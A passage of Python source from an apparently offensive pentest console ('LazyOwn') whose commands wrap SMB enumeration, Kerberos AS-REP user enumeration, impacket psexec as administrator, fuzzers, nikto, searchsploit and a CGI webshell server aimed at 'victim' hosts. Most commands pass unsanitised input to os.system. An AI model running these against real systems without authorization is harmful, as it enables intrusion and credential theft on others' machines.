            print_msg(f"Parameters loaded from {GREEN}{filename}{RESET}")
        except FileNotFoundError:
            print_error(f"{filename} not found")
        except json.JSONDecodeError:
            print_error(f"Error decoding {filename}")

    def do_exit(self, arg):
        """Exit the command line interface.

        This function prompts the user to confirm whether they want to exit the command line interface. If confirmed, it will terminate the program. Otherwise, it will cancel the exit.

        Usage:
            exit

        :param arg: This parameter is not used in this function.
        :type arg: str

        :returns: None

        Manual execution:
        1. Prompt the user with a confirmation message to exit the CLI.
        2. If the user confirms with 's', print a message and exit the program.
        3. If the user provides any other input, print a cancellation message and remain in the CLI.

        Dependencies:
        - `sys.exit` function for exiting the program.

        Example:
            To execute the function, simply call `exit`.

        Note:
            - The confirmation prompt is in Spanish.
            - Ensure that `sys` is imported in your script.
        """


        confirm = (
            input(f"{YELLOW}¿Seguro que quieres salir? {GREEN}(s/n): {RESET}")
            .strip()
            .lower()
        )
        if confirm == "s":
            print_msg(f"{RED}Saliendo ...{RESET}")
            sys.exit(0)
        else:
            print_warn(f"{RED}Salida Cancelada .{RESET}")
            return False

    def do_fixperm(self, line):
        """Fix permissions for LazyOwn shell scripts.

        This function adjusts the file permissions for shell scripts and CGI scripts in the `modules` directory, making them executable.

        Usage:
            fixperm

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Change the permissions of all shell scripts in the `modules` directory to be executable.
        2. Change the permissions of all files in the `modules/cgi-bin` directory to be executable.

        Dependencies:
        - `chmod` command must be available on the system.

        Example:
            To execute the function, simply call `fixperm`.

        Note:
            - Ensure you have the necessary permissions to modify file permissions.
        """

        print_msg("[F]ix script perm")
        os.system("chmod +x modules/*.sh")
        os.system("chmod +x modules/cgi-bin/*")
        return

    def do_lazywebshell(self, line):
        """Run LazyOwn webshell server.

        This function starts a web server that serves the `lazywebshell.py` script from the `modules` directory on port 8888. The server is run in the background.

        Usage:
            lazywebshell

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Start a Python HTTP server with CGI support on port 8888.
        2. The server serves files from the `modules` directory.

        Dependencies:
        - Python 3.x must be installed on the system.
        - The `http.server` module should be available.

        Example:
            To execute the function, simply call `lazywebshell`.

        Note:
            - The server runs in the background, and the output will not be displayed in the terminal.
        """

        print_msg("Running Server in localhost:8888/cgi-bin/lazywebshell.py")
        os.system("cd modules && python3 -m http.server 8888 --cgi &")
        return

    def do_getcap(self, line):
        """Retrieve and display file capabilities on the system.

        This function uses the `getcap` command to recursively list capabilities for files starting from the root directory (`/`). The output is filtered to suppress error messages.

        Usage:
            getcap

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Run the `getcap -r /` command to list file capabilities recursively from the root directory.
        2. Redirect standard error to `/dev/null` to suppress error messages.
        3. Copy to clipboard the command to appy in the victim machine. 
        Dependencies:
        - `getcap` must be installed on the system.

        Example:
            To execute the function, simply call `do_getcap`.

        Note:
            - The command may require elevated permissions to access certain directories and files.
        """
        command = "getcap -r / 2>/dev/null"
        print_msg(f"Try get capabilities {RESET}")
        print_msg(command)
        os.system(command)
        copy2clip(command)
        return

    def do_getseclist(self, line):
        """Get the SecLists wordlist from GitHub.

        This function downloads and extracts the SecLists wordlist from GitHub to the `/usr/share/wordlists/` directory.

        Usage:
            getseclist

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Navigate to the `/usr/share/wordlists/` directory.
        2. Download the SecLists repository using `wget`.
        3. Extract the downloaded ZIP file.
        4. Remove the ZIP file after extraction.

        Dependencies:
        - `wget` must be installed on the system.
        - `unzip` must be installed on the system.
        - `sudo` must be available for downloading and extracting files.

        Example:
            To execute the function, simply call `getseclist`.

        Note:
            - Ensure that you have the necessary permissions to write to the `/usr/share/wordlists/` directory.
            - If `wget` or `unzip` is not installed, the function will fail.
        """

        print_msg(f"Try to get seclist wordlist [;,;] {RESET}")
        os.system("""cd /usr/share/wordlists/ && sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
        && sudo unzip SecList.zip \
        && sudo  rm -f SecList.zip""")

    def do_smbclient(self, line):
        """
        Interacts with SMB shares using the `smbclient` command to perform the following operations:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
        2. If `line` (share name) is provided:
        - Attempts to access the specified SMB share on the remote host using the command: `smbclient -N \\\\{rhost}\\{line}`
        3. If `line` is not provided:
        - Lists available SMB shares on the remote host with the command: `smbclient -N -L \\\\{rhost}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

        :param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
        :returns: None
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        path_cred = "sessions/credentials.txt"
        url = self.params["url"]
        domain = get_domain(url)
        if not check_rhost(rhost):
            return

        if not check_lhost(lhost):
            return

            

        if not os.path.exists(path_cred):
            print_error("you need credentials.txt exec: createcredentials admin:admin")
            return
        with open(path_cred, "r") as file:
            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace("\n", "")
                command = f"smbclient -L //{domain}/{line} -U '{domain}\\\\{user}'"
                copy2clip(passwd)
                print_msg(command)
                os.system(command)
                return
        
        if line:
            print_msg(f"Try .. smbclient -N \\\\{rhost}\\\\{line} {RESET}")
            os.system(f"smbclient -N \\\\\\\\{rhost}\\\\{line}")
            return
        
        
        print_msg(f"Perform this command: smbclient -N -L \\\\{rhost}\\ {RESET}")
        os.system(f"smbclient -N -L \\\\{rhost}\\")
        print_msg(
            f'Exploit smb if is posible mount -t cifs "//{lhost}/share" /mnt/smb '
        )
        return

    def do_smbmap(self, line):
        """smbmap -H 10.10.10.3 [OPTIONS]
        Uses the `smbmap` tool to interact with SMB shares on a remote host:

        1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
        2. If no `line` (share name or options) is provided:
        - Attempts to access SMB shares on the remote host with a default user `deefbeef` using the command: `smbmap -H {rhost} -u 'deefbeef'`
        3. If `line` is provided:
        - Executes `smbmap` with the specified options or share name using the command: `smbmap -H {rhost} -R {line}`
        4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/documents" /mnt/smb`

        :param line: Options or share name to use with `smbmap`. If not provided, uses a default user to list shares.
        :returns: None"""
        
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        
        if not check_rhost(rhost):
            return

        if not check_lhost(lhost):
            return

        if not line:
            print_msg(f"Try... smbmap -H {rhost} -u 'deefbeef'")
            os.system(f"smbmap -H {rhost} -u 'deefbeef'")
            return

        print_msg(f"Try... smbmap -H {rhost} -R {line}")
        os.system(f"smbmap -H {rhost} -R {line}")
        print_msg(
            f'exploit smb if is posible mount -t cifs "//{lhost}/documents" /mnt/smb '
        )
        return

    def do_getnpusers(self, line):
        """sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt
        Executes the `impacket-GetNPUsers` command to enumerate users with Kerberos pre-authentication disabled.

        1. Checks if the `line` (domain) argument is provided; if not, an error message is displayed, instructing the user to provide a domain.
        2. Executes `impacket-GetNPUsers` with the following options:
        - `-no-pass`: Skips password prompt.
        - `-usersfile sessions/users.txt`: Specifies the file containing the list of users to check.

        :param line: The domain to query. Must be provided in the format `domain.com`. Example usage: `getnpusers domain.com`
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            sudo impacket-GetNPUsers <domain> -no-pass -usersfile sessions/users.txt
        Replace `<domain>` with the actual domain name you want to query."""

        if not line:
            print_error(
                "You must pass the domain by argument ex: getnpusers domain.com more info help getnpusers"
            )
            return
        os.system(
            f"sudo impacket-GetNPUsers {line}/ -no-pass -usersfile sessions/users.txt"
        )
        return

    def do_psexec(self, line):
        """
        Copies the `rhost` IP address to the clipboard and updates the prompt with the IP address.

        1. Retrieves the `rhost` IP address from the `self.params` parameter.
        2. Checks if the `rhost` is valid using `check_rhost()`. If invalid, the function returns without making changes.
        3. If `line` is 'clean', resets the custom prompt to its original state.
        4. Otherwise, updates the prompt to include the `rhost` IP address in the specified format.
        5. Copies the `rhost` IP address to the clipboard using `xclip`.
        6. Prints a message confirming that the IP address has been copied to the clipboard.

        :param line: This parameter determines whether the prompt should be reset or updated with the IP address.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            rhost <line>
        Replace `<line>` with 'clean' to reset the prompt, or any other string to update the prompt with the IP address.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        rhost = self.params["rhost"]
        os.system(f"impacket-psexec administrator@{rhost}")

    def do_rpcdump(self, line):
        """
        Executes the `rpcdump.py` script to dump RPC services from a target host.

        1. Retrieves the target host IP from the `rhost` parameter.
        2. Checks if the `rhost` parameter is valid using `check_rhost()`. If invalid, the function returns early.
        3. Executes the `rpcdump.py` script on port 135 and 593 to gather RPC service information from the target host.

        :param line: This parameter is not used in this command but is included for consistency with other methods.
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            rpcdump.py -p 135 <target_host>
            rpcdump.py -p 593 <target_host>
        Replace `<target_host>` with the IP address or hostname of the target machine.
        """
        rhost = self.params["rhost"]
        if check_rhost(rhost):
            print_msg(f"Try... rpcdump.py -p 135 {rhost}{RESET}")
            os.system(f"rpcdump.py -p 135 {rhost}")
            print_msg(f"Try... rpcdump.py -p 593 {rhost}{RESET}")
            os.system(f"rpcdump.py -p 593 {rhost}")
        return

    def do_dig(self, line):
        """
        Executes the `dig` command to query DNS information.

        1. Retrieves the DNS server IP from the `line` parameter and the target host from the `rhost` parameter.
        2. If either the DNS server or `rhost` is not provided, an error message is printed.
        3. Executes the `dig` command to query the version of the DNS server and additional records.

        :param line: DNS server IP or hostname. Must be provided for the `dig` command.
        :param rhost: Target host for additional `dig` queries.

        :returns: None

        Manual execution:
        To manually run these commands, use the following syntax:
            dig version.bind CHAOS TXT @<dns_server>
            dig any <domain> @<rhost>

        Replace `<dns_server>` with the IP address or hostname of the DNS server, `<domain>` with the target domain, and `<rhost>` with the IP address or hostname of the target machine.
        """

        rhost = self.params["rhost"]
        if not line or not rhost:
            print_error(
                "[-] rhost must be set or you must pass the dns argument like dig box.htb"
            )
            return
        print_msg(f"Try dig version.bind CHAOS TXT @{line} {RESET}")
        os.system(f"dig version.bind CHAOS TXT @{line}")
        print_msg(f"dig any {line} @{rhost}")
        os.system(f"dig any {line} @{rhost}")
        return

    def do_cp(self, line):
        """
        Copies a file from the ExploitDB directory to the sessions directory.

        1. Retrieves the path to the ExploitDB directory and the target file from the `line` parameter.
        2. Copies the specified file from the ExploitDB directory to the `sessions` directory in the current working directory.

        :param line: The relative path to the file within the ExploitDB directory. For example, `java/remote/51884.py`.
        :param exploitdb: The path to the ExploitDB directory. This must be set in advance or provided directly.

        :returns: None

        Manual execution:
        To manually copy files, use the following syntax:
            cp <exploitdb_path><file_path> <destination_path>

        Replace `<exploitdb_path>` with the path to your ExploitDB directory, `<file_path>` with the relative path to the file, and `<destination_path>` with the path where you want to copy the file.

        For example:
            cp /usr/share/exploitdb/exploits/java/remote/51884.py /path/to/sessions/
        """

        exploitdb = self.params["exploitdb"]
        path = os.getcwd()
        if not line or not exploitdb:
            print_error(
                "exploitdb must be set, use set exploitdb /usr/share/exploitdb/exploits/ or pass the relative directory path show in the ss alias of command searchsploit, like cp java/remote/51884.py to see the ralive path use ex: ss TeamCity -x java/remote/51884.py"
            )
            return
        print_msg(f"Try cp {exploitdb}{line} {path}/sessions/{RESET}")
        os.system(f"cp {exploitdb}{line} {path}/sessions/")

        return

    def do_dnsenum(self, line):
        """
        Performs DNS enumeration using `dnsenum` to identify subdomains for a given domain.

        1. Executes the `dnsenum` command with parameters to specify the DNS server, output file, and wordlist for enumeration.

        :param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
        :param rhost: The DNS server to use for enumeration, e.g., `10.10.11.24`.
        :param dnswordlist: The path to the DNS wordlist file used for subdomain discovery.

        :returns: None

        Manual execution:
        To manually perform DNS enumeration, use the following command:
            dnsenum --dnsserver <dns_server> --enum -p 0 -s 0 -o <output_file> -f <dns_wordlist> <target_domain>

        Replace `<dns_server>` with the DNS server IP, `<output_file>` with the file path to save the results, `<dns_wordlist>` with the path to your DNS wordlist file, and `<target_domain>` with the domain to be enumerated.

        For example:
            dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb
        """

        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not rhost or not dnswordlist:
            print_error(
                "rhost and dnswordlist must be set example: set rhost 10.10.10.10 or you need pass the domain "
            )
            return
        print_msg(
            f"Try ... dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line} {RESET}"
        )
        os.system(
            f"dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line}"
        )
        return

    def do_dnsmap(self, line):
        """
        Performs DNS enumeration using `dnsmap` to discover subdomains for a specified domain.

        1. Executes the `dnsmap` command to scan the given domain with a specified wordlist.

        :param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
        :param dnswordlist: The path to the wordlist file used for DNS enumeration.

        :returns: None

        Manual execution:
        To manually perform DNS enumeration, use the following command:
            dnsmap <target_domain> -w <dns_wordlist>

        Replace `<target_domain>` with the domain you want to scan and `<dns_wordlist>` with the path to your DNS wordlist file.

        For example:
            dnsmap ghost.htb -w /path/to/dnswordlist.txt
        """

        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not dnswordlist:
            print_error(
                f"dnswordlist must be set example: set dnswordlist path/to/wordlist or you need pass the domain {RESET}"
            )
            return
        print_msg(f"    {GREEN}[+] Try ... dnsmap {line} -w {dnswordlist} {RESET}")
        os.system(f"dnsmap {line} -w {dnswordlist}")
        return

    def do_whatweb(self, line):
        """
        Performs a web technology fingerprinting scan using `whatweb`.

        1. Executes the `whatweb` command to identify technologies used by the target web application.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target web host to be scanned, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform web technology fingerprinting, use the following command:
            whatweb <target_host>

        Replace `<target_host>` with the URL or IP address of the web application you want to scan.

        For example:
            whatweb example.com
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... whatweb {rhost}{RESET}")
        os.system(f"whatweb {rhost}")

    def do_enum4linux(self, line):
        """
        Performs enumeration of information from a target Linux/Unix system using `enum4linux`.

        1. Executes the `enum4linux` command with the `-a` option to gather extensive information from the specified target.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target host for enumeration, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually enumerate information from a Linux/Unix system, use the following command:
            enum4linux -a <target_host>

        Replace `<target_host>` with the IP address or hostname of the target system.

        For example:
            enum4linux -a 192.168.1.10
        """

        if not self.params["rhost"]:
            print_msg("rhost must be set")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... enum4linux -a {rhost} {RESET}")
        os.system(f"enum4linux -a {rhost}")
        return

    def do_nbtscan(self, line):
        """
        Performs network scanning using `nbtscan` to discover NetBIOS names and addresses in a specified range.

        1. Executes the `nbtscan` command with the `-r` option to scan the specified range of IP addresses for NetBIOS information.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The target network range for scanning, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a NetBIOS scan across a network range, use the following command:
            sudo nbtscan -r <network_range>

        Replace `<network_range>` with the IP address range you want to scan. For example:
            sudo nbtscan -r 192.168.1.0/24
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... sudo nbtscan -r {rhost}/24 {RESET}")
        os.system(f"sudo nbtscan -r {rhost}/24")
        return

    def do_rpcclient(self, line):
        """
        Executes the `rpcclient` command to interact with a remote Windows system over RPC (Remote Procedure Call) using anonymous credentials.

        1. Runs `rpcclient` with the `-U ''` (empty username) and `-N` (no password) options to connect to the target host specified by `rhost`.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the remote host to connect to, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually interact with a remote Windows system using RPC, use the following command:
            rpcclient -U '' -N <target_ip>

        Replace `<target_ip>` with the IP address of the target system. For example:
            rpcclient -U '' -N 10.10.10.10
        """

        if not self.params["rhost"]:
            print_error(f"rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... rpcclient -U '' -N {rhost} {RESET}")
        os.system(f"rpcclient -U '' -N {rhost}")
        return

    def do_nikto(self, line):
        """
        Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.

        1. Executes `nikto` with the `-h` option to specify the target host IP address.
        2. Installs `nikto` if it is not already installed.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the target web server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a web server vulnerability scan using `nikto`, use the following command:
            nikto -h <target_ip>

        Replace `<target_ip>` with the IP address of the target web server. For example:
            nikto -h 10.10.10.10
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        if not is_binary_present("nikto"):
            print_warn("Installing nikto...")
            os.system("sudo apt install nikto -y")
        
        options = {
            "ask": input("    [?] Enter whether to ask about submitting updates (yes, no, auto): "),
            "check6": input("    [?] Check if IPv6 is working (yes/no): "),
            "cgidirs": input("    [?] Enter CGI dirs to scan (none, all, or values like '/cgi/ /cgi-a/'): "),
            "config": input("    [?] Enter the config file to use: "),
            "display": input("    [?] Enter display options (1, 2, 3, 4, D, E, P, S, V): "),
            "dbcheck": input("    [?] Check database and key files for syntax errors (yes/no): "),
            "evasion": input("    [?] Enter encoding technique (1-8, A, B): "),
            "followredirects": input("    [?] Follow 3xx redirects (yes/no): "),
            "format": input("    [?] Enter output format (csv, json, htm, nbe, sql, txt, xml): "),
            "host": rhost,
            "id": input("    [?] Enter host authentication (id:pass or id:pass:realm): "),
            "ipv4": input("    [?] Use IPv4 only (yes/no): "),
            "ipv6": input("    [?] Use IPv6 only (yes/no): "),
            "key": input("    [?] Enter client certificate key file: "),
            "list_plugins": input("    [?] List all available plugins (yes/no): "),
            "maxtime": input("    [?] Enter maximum testing time per host (e.g., 1h, 60m, 3600s): "),
            "mutate": input("    [?] Enter mutation options (1-6): "),
            "nointeractive": input("    [?] Disable interactive features (yes/no): "),
            "nolookup": input("    [?] Disable DNS lookups (yes/no): "),
            "nossl": input("    [?] Disable the use of SSL (yes/no): "),
            "noslash": input("    [?] Strip trailing slash from URL (yes/no): "),
            "no404": input("    [?] Disable nikto attempting to guess a 404 page (yes/no): "),
            "option": input("    [?] Override an option in nikto.conf: "),
            "output": input("    [?] Write output to this file ('.' for auto-name): "),
            "pause": input("    [?] Pause between tests (seconds): "),
            "plugins": input("    [?] Enter list of plugins to run (default: ALL): "),
            "port": input("    [?] Enter port to use (default 80): "),
            "rsacert": input("    [?] Enter client certificate file: "),
            "root": input("    [?] Prepend root value to all requests (format: /directory): "),
            "save": input("    [?] Save positive responses to this directory ('.' for auto-name): "),
            "ssl": input("    [?] Force ssl mode on port (yes/no): "),
            "tuning": input("    [?] Enter scan tuning (1-9, a-e, x): "),
            "timeout": input("    [?] Enter timeout for requests (default 10 seconds): "),
            "userdbs": input("    [?] Load only user databases, not the standard databases (all, tests): "),
            "useragent": input("    [?] Override the default useragent: "),
            "until": input("    [?] Run until the specified time or duration: "),
            "url": self.params["url"],
            "usecookies": input("    [?] Use cookies from responses in future requests (yes/no): "),
            "useproxy": input("    [?] Use the proxy defined in nikto.conf, or argument http://server:port: "),
            "version": input("    [?] Print plugin and database versions (yes/no): "),
            "vhost": input("    [?] Enter virtual host (for Host header): "),
            "404code": input("    [?] Ignore these HTTP codes as negative responses (always). Format: '302,301': "),
            "404string": input("    [?] Ignore this string in response body content as negative response (always). Can be a regular expression: ")
        }

        nikto_command = f"nikto -h {options['host']}"

        for key, value in options.items():
            if value:
                if key == "host":
                    continue
                elif key in ["ask", "check6", "dbcheck", "followredirects", "ipv4", "ipv6", "list_plugins", "nointeractive", "nolookup", "nossl", "noslash", "no404", "ssl", "usecookies", "useproxy", "version"]:
                    nikto_command += f" --{key} {value}"
                else:
                    nikto_command += f" --{key} {value}"

        print_msg(f"Running nikto with the following command: {nikto_command}")
        os.system(nikto_command)
        return


    def do_finalrecon(self, line):
        """
        Runs the `finalrecon` tool to perform a web server vulnerability scan against the specified target host.

        1. Executes `finalrecon` with the `-h` option to specify the target host IP address.

        :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
        :param rhost: The IP address of the target web server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually perform a web server vulnerability scan using `finalrecon`, use the following command:
            finalrecon --url=http://<target_ip> --full -o txt -cd <directory_reports> 

        Replace `<target_ip>` with the IP address of the target web server. For example:
            finalrecon --url=http://192.168.1.92 --full -o txt -cd /home/gris/finalrecon 
        """

        if not is_binary_present("finalrecon"):
            print_error(f"You need install finalrecon first:{GREEN} apt install finalrecon")
            return

        if not line:
            print_error(f"You must pass the url to perfom the scann ex: {GREEN}finalrecon http://10.10.10.10/")
            return
        command = f"finalrecon --url={line} --full -o txt -cd sessions/finalrecon_manual "
        copy2clip(command)
        os.system(command)
        return

    def do_openssl_sclient(self, line):
        """
        Uses `openssl s_client` to connect to a specified host and port, allowing for testing and debugging of SSL/TLS connections.

        :param line: The port number to connect to on the target host. This must be provided as an argument.
        :param rhost: The IP address or hostname of the target server, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually connect to a server using `openssl s_client` and test SSL/TLS, use the following command:
            openssl s_client -connect <target_ip>:<port>

        Replace `<target_ip>` with the IP address or hostname of the target server and `<port>` with the port number. For example:
            openssl s_client -connect 10.10.10.10:443
        """

        if not self.params["rhost"] or not line:
            print_error(
                "rhost must be set and you need pass the port by argument ex: openssl_sckient 443"
            )
            return
        rhost = self.params["rhost"]
        print_msg(f"Try... openssl s_client -connect  {rhost}:{line} {RESET}")
        os.system(f"openssl s_client -connect  {rhost}:{line}")
        return

    def do_ss(self, line):
        """
        Uses `searchsploit` to search for exploits in the Exploit Database based on the provided search term.

        :param line: The search term or query to find relevant exploits. This must be provided as an argument.

        :returns: None

        Manual execution:
        To manually search for exploits using `searchsploit`, use the following command:
            searchsploit <search_term>

        Replace `<search_term>` with the term or keyword you want to search for. For example:
            searchsploit kernel
        """

        print_msg(f"Searching in searchsploit{RESET}")
        os.system(f"searchsploit {line}")
        

        getnvd = find_ss(line)
        nvddb(getnvd)
        getnvd = find_ea(line)
        exploitalert(getnvd)
        getnvd = find_ps(line)
        packetstormsecurity(getnvd)
        return

    def do_wfuzz(self, line):
        """
        Uses `wfuzz` to perform fuzzing based on provided parameters. This function supports various options for directory and file fuzzing.

        :param line: The options and arguments for `wfuzz`. The `line` parameter can include the following:
            - `sub <domain>`: Fuzz DNS subdomains. Requires `dnswordlist` to be set.
            - `iis`: Fuzz IIS directories. Uses a default wordlist if `iiswordlist` is not set.
            - Any other argument: General directory and file fuzzing.

        :returns: None

        Manual execution:
        To manually use `wfuzz` for directory and file fuzzing, use the following commands:

        1. For fuzzing DNS subdomains:
            wfuzz -c <extra_options> -t <threads> -w <wordlist> -H 'Host: FUZZ.<domain>' <domain>

        Example:
            wfuzz -c --hl=7 -t 200 -w /path/to/dnswordlist -H 'Host: FUZZ.example.com' example.com

        2. For fuzzing IIS directories:
            wfuzz -c <extra_options> -t <threads> -w /path/to/iiswordlist http://<rhost>/FUZZ

        Example:
            wfuzz -c --hl=7 -t 200 -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.10/FUZZ

        3. For general directory and file fuzzing:
            wfuzz -c <extra_options> -t <threads> -w <wordlist> http://<rhost>/FUZZ

        Example:
            wfuzz -c --hl=7 -t 200 -w /path/to/dirwordlist http://10.10.10.10/FUZZ
        """

        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print_error(f"dirwordlist and rhost must be set{RESET}")
            return

        if line:
            if line.startswith("sub"):
                params = line.split(" ")
                count = len(params)
                dnswordlist = self.params["dnswordlist"]
                if not dnswordlist:
                    print_error(
                        "use payload or p to load the parameter from payload.json, or just set dnswordlist path/to/dnswordlist"
                    )
                    return

                if count == 1:
                    print_error(
                        f"you must pass the dommain like argument ex:{GREEN} wfuzz sub box.htb"
                    )
                    return

                arg1 = params[0]
                domain = params[1]
                if count > 2:
                    arg3 = params[2]
                else:
                    arg3 = ""
                print_msg(
                    f"Try ...  wfuzz -c {arg3} -t 200 -w {dnswordlist} -H 'Host: FUZZ.{domain}' {domain} {RESET}"
                )
                os.system(
                    f"wfuzz -c {arg3} -t 200 -w {dnswordlist} -H 'Host: FUZZ.{domain}' {domain}"
                )
                return

            if line.startswith("iis"):
                params = line.split(" ")
                print_msg(params)
                count = len(params)
                arg1 = params[0]
                iiswordlist = "/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt"  # dont know why this line dont work ... self.params['iiswordlist']

                if not os.path.exists(iiswordlist):
                    print_error(
                        f"you must have file iiswordlist use the command: getseclist, use p or payload to load parameters from payload.json, or just set iiswordlist /pat/to/iiswordlist"
                    )
                    return
                # Abre el archivo en modo de lectura
                if count > 1:
                    arg3 = params[1]
                else:
                    arg3 = ""
                print_msg(
                    f"Try ...  wfuzz -c {arg3} -t 200 -w {iiswordlist} http://{rhost}/FUZZ {RESET}"
                )
                os.system(
                    f"wfuzz -c {arg3} -t 200 -w {iiswordlist} http://{rhost}/FUZZ"
                )
                return

        print_msg(
            f"Try ... wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ {RESET}"
        )
        os.system(f"wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
        return

    def do_launchpad(self, line):
        """
        Searches for packages on Launchpad based on the provided search term and extracts codenames from the results. The distribution is extracted from the search term.

        :param line: The search term to be used for querying Launchpad. The `line` parameter should be a string containing
                    the search term, e.g., "8.2p1 Ubuntu 4ubuntu0.11".

        :returns: None

        Manual execution:
        To manually execute the equivalent command, use the following steps:

        1. Extract the distribution from the search term:
        - This function assumes the distribution name is part of the search term and is used to build the URL.

        2. URL encode the search term:
        - Replace spaces with `%20` to form the encoded search query.

        3. Use `curl` to perform the search and filter results:
        curl -s "https://launchpad.net/+search?field.text=<encoded_search_term>" | grep 'href' | grep '<distribution>' | grep -oP '(?<=href="https://launchpad.net/<distribution>/)[^/"]+' | sort -u

        Example:
            If the search term is "8.2p1 Ubuntu 4ubuntu0.11", the command would be:
            curl -s "https://launchpad.net/+search?field.text=8.2p1%20Ubuntu%204ubuntu0.11" | grep 'href' | grep 'ubuntu' | grep -oP '(?<=href="https://launchpad.net/ubuntu/)[^/"]+' | sort -u

        Notes:
            - Ensure that `curl` is installed and accessible in your environment.
            - The extracted codenames are printed to the console.
        """

        parts = line.split()
        if len(parts) > 1:
            distribution = parts[1].lower()
        else:
            distribution = "ubuntu"

        encoded_line = quote(line.strip())

        command = f"curl -s \"https://launchpad.net/+search?field.text={encoded_line}\" | grep 'href' | grep '{distribution}' | grep -oP '(?<=href=\"https://launchpad.net/{distribution}/)[^/\"]+' | sort -u"

        print_msg(
            "Searches for packages on Launchpad based on the provided search, no warranties. ssh package give the best results"
        )
        os.system(command)

    def do_gobuster(self, line):
        """
        Uses `gobuster` for directory and virtual host fuzzing based on provided parameters. Supports directory enumeration and virtual host discovery.

        :param line: The options and arguments for `gobuster`. The `line` parameter can include the following:
            - `url`: Perform directory fuzzing on a specified URL. Requires `url` and `dirwordlist` to be set.
            - `vhost`: Perform virtual host discovery on a specified URL. Requires `url` and `dirwordlist` to be set.
            - Any other argument: General directory fuzzing with additional parameters.

        :returns: None

        Manual execution:
        To manually use `gobuster`, use the following commands:

        1. For directory fuzzing:
            gobuster dir --url <url>/ --wordlist <wordlist>

        Example:
            gobuster dir --url http://example.com/ --wordlist /path/to/dirwordlist

        2. For virtual host discovery:
            gobuster vhost --append-domain -u <url> -w <wordlist> --random-agent -t 600

        Example:
            gobuster vhost --append-domain -u http://example.com -w /path/to/dirwordlist --random-agent -t 600

        3. For general directory fuzzing with additional parameters:
            gobuster dir --url http://<rhost>/ --wordlist <wordlist> <additional_parameters>

        Example:
            gobuster dir --url http://10.10.10.10/ --wordlist /path/to/dirwordlist -x .php,.html
        """

        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print_error(f"rhost and dirwordlist must be set {RESET}")
            return
        if line == "url":
            url = self.params["url"]
            if not url:
                print_error(f"url must be set, ex: set url http://domain.ext {RESET}")
                return
            print_msg(f"Try gobuster dir --url {url}/ --wordlist {dirwordlist} {RESET}")
            os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist}")
            return
        if line.startswith("vhost"):
            url = self.params["url"]
            if not url:
                print_error(f"url must be set, ex: set url http://domain.ext {RESET}")
                return
            print_msg(
                f"Try gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600{RESET}"
            )
            os.system(
                f"gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600"
            )
            return
        print_msg(
            f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} {RESET}"
        )
